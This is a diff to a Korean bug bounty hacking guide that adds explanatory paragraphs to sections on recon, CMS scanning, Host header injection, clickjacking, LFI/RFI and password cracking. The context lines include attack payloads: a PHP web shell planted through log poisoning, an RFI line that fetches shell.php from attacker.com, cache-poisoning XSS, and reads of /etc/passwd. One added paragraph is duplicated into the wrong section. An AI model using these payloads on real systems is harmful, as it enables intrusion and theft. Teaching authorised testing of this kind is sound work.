@@ -50,6 +50,8 @@ Informational             : 보통 무보상, 감사 표시
 
 ### 3-1. 서브도메인 열거
 
+서브도메인을 열거하는 Python 스크립트입니다. Subfinder, Amass 결과와 DNS 브루트포스를 결합하여 공격 표면을 최대한 파악합니다.
+
 ```python
 #!/usr/bin/env python3
 """
@@ -367,6 +369,8 @@ cat live_subs.txt | getJS | grep "\.js$" | xargs -I{} sh -c 'curl -s {} | python
 
 ### 3-3. 기술 스택 파악
 
+whatweb으로 대상 웹사이트의 기술 스택을 파악합니다. CMS, 프레임워크, 서버 소프트웨어 정보를 통해 해당 기술의 알려진 취약점을 조사합니다.
+
 ```bash
 # whatweb
 whatweb https://target.com -a 3
@@ -526,6 +530,9 @@ BApp Store에서 설치:
 
 ### 5-2. 범위(Scope) 설정
 
+
+버그 바운티 프로그램의 범위(Scope)를 먼저 정확히 확인하는 것이 필수입니다. 범위 밖 시스템을 테스트하면 법적 문제가 발생할 수 있으며, 대부분의 플랫폼은 In-scope/Out-of-scope를 명확히 구분하여 공지합니다.
+
 ```
 Target → Scope 설정:
 1. Add → 타겟 도메인 추가
@@ -537,6 +544,8 @@ Target → Scope 설정:
 ```
 
 ### 5-3. Turbo Intruder로 레이스 컨디션
+
+Turbo Intruder 스크립트로 레이스 컨디션 취약점을 익스플로잇합니다. 쿠폰 중복 사용, 잔액 초과 출금 등 동시 요청 처리 오류를 테스트합니다.
 
 ```python
 # race_condition_coupon.py — Turbo Intruder 스크립트
@@ -724,6 +733,8 @@ if __name__ == "__main__":
 
 ### 6-1. 좋은 리포트 구조
 
+버그 바운티 리포트의 표준 구조입니다. 취약점 요약, 재현 단계, 영향도, PoC, 수정 제안을 명확히 작성해야 높은 보상을 받을 수 있습니다.
+
 ```markdown
 ## 취약점 요약
 [취약점 유형] in [컴포넌트] — [한 줄 영향 요약]
@@ -788,6 +799,9 @@ bio 필드 저장 시 HTML 특수문자 인코딩:
 
 ## 7. 자동화 도구 모음
 
+
+Nuclei는 YAML 기반 템플릿으로 웹 취약점을 빠르게 스캔하는 도구입니다. ProjectDiscovery가 관리하는 공개 템플릿 저장소를 활용하면 CVE, 설정 오류, 노출된 파일 등을 대규모로 탐지할 수 있습니다.
+
 ```bash
 # Nuclei — 다목적 취약점 스캐너 (템플릿 기반)
 nuclei -u https://target.com -t cves/ -o nuclei_cves.txt
@@ -849,6 +863,9 @@ SSRF (Medium) + AWS 메타데이터 접근 (High) + IAM 자격증명 탈취 (Cri
 ## 8-2. CMS 해킹 방법론 (Bug Bounty 관점)
 
 ### WordPress 취약점 탐지
+
+WPScan으로 WordPress 사이트의 취약한 플러그인, 테마, 사용자 계정을 열거합니다. 가장 광범위하게 사용되는 CMS이므로 버그 바운티에서 자주 대상이 됩니다.
+
 ```bash
 # WPScan — WordPress 전용 취약점 스캐너
 wpscan --url https://target.com
@@ -866,6 +883,9 @@ curl -X POST https://target.com/xmlrpc.php \
 ```
 
 ### Drupal / Joomla 취약점 탐지
+
+Droopescan으로 Drupal/Joomla CMS의 버전과 플러그인을 열거합니다. Drupalgeddon 등 알려진 RCE 취약점을 확인합니다.
+
 ```bash
 # Droopescan — Drupal 스캐너
 droopescan scan drupal -u https://target.com
@@ -905,6 +925,8 @@ nuclei -u https://target.com -tags cms,wordpress,drupal,joomla
 
 ## 8-3. GitHub / 서브도메인 탈취 (Subdomain Takeover)
 
+서브도메인 탈취(Subdomain Takeover) 취약점을 탐지합니다. CNAME이 삭제된 외부 서비스를 가리키는 서브도메인을 공격자가 등록할 수 있습니다.
+
 ```bash
 # 서브도메인 탈취 취약점 탐지
 # CNAME이 외부 서비스를 가리키지만 해당 서비스에 등록 안 된 경우
@@ -941,6 +963,9 @@ HTTP Host 헤더를 서버가 그대로 신뢰하여 처리할 때 발생
 ```
 
 ### Host Header Injection 기법
+
+Host 헤더 인젝션으로 비밀번호 재설정 링크를 공격자 도메인으로 변조합니다. 이메일에 포함된 링크가 공격자 서버를 가리키게 됩니다.
+
 ```http
 # 1. 비밀번호 재설정 링크 변조
 POST /reset-password HTTP/1.1
@@ -966,6 +991,9 @@ Host: attacker.com   ← 두 번째 Host가 우선 처리될 수 있음
 ```
 
 ### 캐시 포이즈닝 (Host Header → Web Cache Poisoning)
+
+Host 헤더를 통한 웹 캐시 포이즈닝 공격입니다. CDN이 변조된 응답을 캐시하면 다른 사용자도 피해를 입는 증폭 효과가 있습니다.
+
 ```bash
 # CDN/리버스 프록시가 Host 헤더를 응답에 반영하면서 캐시할 때
 GET / HTTP/1.1
@@ -976,6 +1004,9 @@ X-Forwarded-Host: evil.com"><script>alert(1)</script>
 ```
 
 ### Host Header Injection 방어
+
+허용된 호스트 화이트리스트로 Host 헤더 인젝션을 방어합니다. 비밀번호 재설정 등 링크 생성 시 반드시 검증이 필요합니다.
+
 ```python
 # Flask: 허용된 호스트 화이트리스트
 ALLOWED_HOSTS = ['target.com', 'www.target.com']
@@ -1010,6 +1041,9 @@ RESET_BASE_URL = 'https://target.com/reset'
 ```
 
 ### Clickjacking PoC
+
+Clickjacking 취약점을 증명하는 PoC 페이지입니다. X-Frame-Options 또는 CSP frame-ancestors 헤더가 없는 페이지를 iframe으로 삽입하여 클릭을 유도합니다.
+
 ```html
 <!DOCTYPE html>
 <html>
@@ -1051,6 +1085,9 @@ RESET_BASE_URL = 'https://target.com/reset'
 ```
 
 ### Clickjacking 탐지
+
+X-Frame-Options와 Content-Security-Policy frame-ancestors 헤더 설정을 점검합니다. 두 헤더가 모두 없으면 Clickjacking에 취약합니다.
+
 ```bash
 # X-Frame-Options 헤더 확인
 curl -I https://target.com | grep -i "x-frame\|frame-ancestors"
@@ -1065,6 +1102,9 @@ Content-Security-Policy: frame-ancestors 'none'
 ```
 
 ### Clickjacking 방어
+
+응답 헤더에 X-Frame-Options와 CSP frame-ancestors를 추가하여 Clickjacking을 방어합니다.
+
 ```http
 # 서버 응답 헤더 추가
 X-Frame-Options: DENY          # 모든 사이트에서 iframe 금지
@@ -1121,6 +1161,9 @@ GET /login?PHPSESSID=test123 HTTP/1.1
 ```
 
 ### Session Fixation 방어
+
+PHP에서 로그인 성공 후 session_regenerate_id()로 세션 ID를 재생성합니다. 이전 세션 ID를 무효화하여 세션 고정 공격을 차단합니다.
+
 ```php
 // PHP: 로그인 성공 후 반드시 세션 재생성
 session_start();
@@ -1136,6 +1179,9 @@ if (login_successful) {
 ## 12. LFI / RFI (파일 인클루전 취약점)
 
 ### LFI (Local File Inclusion)
+
+LFI(Local File Inclusion) 공격으로 서버의 내부 파일을 읽습니다. /etc/passwd, 설정 파일, 로그 파일을 포함시켜 민감한 정보를 탈취합니다.
+
 ```bash
 # 기본 LFI
 http://target.com/?page=../../../etc/passwd
@@ -1165,6 +1211,9 @@ http://target.com/?page=../../../etc/passwd.......................
 ```
 
 ### LFI → RCE (Log Poisoning)
+
+LFI(Local File Inclusion) 공격으로 서버의 내부 파일을 읽습니다. /etc/passwd, 설정 파일, 로그 파일을 포함시켜 민감한 정보를 탈취합니다.
+
 ```bash
 # 1단계: 로그 파일에 PHP 코드 삽입
 curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
@@ -1178,6 +1227,9 @@ http://target.com/?page=../../../../var/log/apache2/access.log&cmd=id
 ```
 
 ### RFI (Remote File Inclusion)
+
+RFI(Remote File Inclusion)로 원격 서버의 악성 스크립트를 포함시킵니다. PHP allow_url_include 설정이 켜진 환경에서만 동작합니다.
+
 ```bash
 # 기본 RFI (allow_url_include=On 설정 시)
 http://target.com/?page=http://attacker.com/shell.php
@@ -1223,6 +1275,9 @@ if (strpos($file, $base) !== 0) {
 ## 13. 패스워드 크래킹 기법
 
 ### 오프라인 크래킹 도구
+
+Hashcat으로 오프라인 해시 크래킹을 수행합니다. GPU 가속을 활용하여 초당 수십억 회의 해시를 계산할 수 있습니다.
+
 ```bash
 # Hashcat — GPU 기반 고속 크래킹
 # MD5 크래킹
@@ -1251,6 +1306,9 @@ john --rules --wordlist=wordlist.txt hashes.txt  # 규칙 적용
 ```
 
 ### 해시 식별
+
+hashid 도구로 해시 문자열의 알고리즘 유형을 자동으로 식별합니다. MD5, SHA-1, bcrypt 등 다양한 해시 형식을 구분할 수 있습니다.
+
 ```bash
 # hashid로 해시 유형 식별
 hashid 5f4dcc3b5aa765d61d8327deb882cf99
